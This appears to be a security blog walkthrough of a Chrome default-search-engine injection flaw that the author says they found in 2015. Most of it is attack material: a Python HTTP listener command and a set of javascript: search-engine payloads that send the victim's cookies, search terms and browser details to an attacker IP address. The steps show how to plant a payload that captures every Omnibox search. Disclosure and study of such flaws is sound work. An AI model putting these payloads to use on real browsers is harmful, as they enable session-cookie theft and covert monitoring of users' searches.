Google Chrome Search Poison – Default Search Engine Exploit
##Introduction
In December 2015, I discovered a vulnerability in Google Chrome's (Chromium included) default search engines feature, whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser.<br>
In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.
##Video Demo
<https://www.youtube.com/watch?v=WoF-LkA6fMk><br>
The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.
##Setting up the Listener in Kali
<code>
<div class="code">
root@kali:~$ <com>python -m SimpleHTTPServer 80</com>
</div>
</code>
##Setup on Victim Machine
1. Go into **"Settings"** in Google Chrome<br>
2. Click on **"Manage Search Engines"**<br>
3. Enter your malicious JS and click **"Make Default"**<br>
<br>
**Example**
<code>
<div class="code">
<com>javascript:window.location='http://192.168.1.182/%s'+escape(document.cookie);</com>
</div>
</code>
Note: 192.168.1.182 is our SimpleHTTPServer.<br>
Now whenever the victim searches using Google Chrome’s Omnibox, the malicious JS will trigger, forwarding you their cookie and search string (%s).<br>
**Other examples**
<code>
<div class="code">
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.cookie);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.baseURI);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.domain);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.URL);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(location.host);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appCodeName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appVersion);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.userAgent);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.product);
</div>
</code>

Tags: search-poison
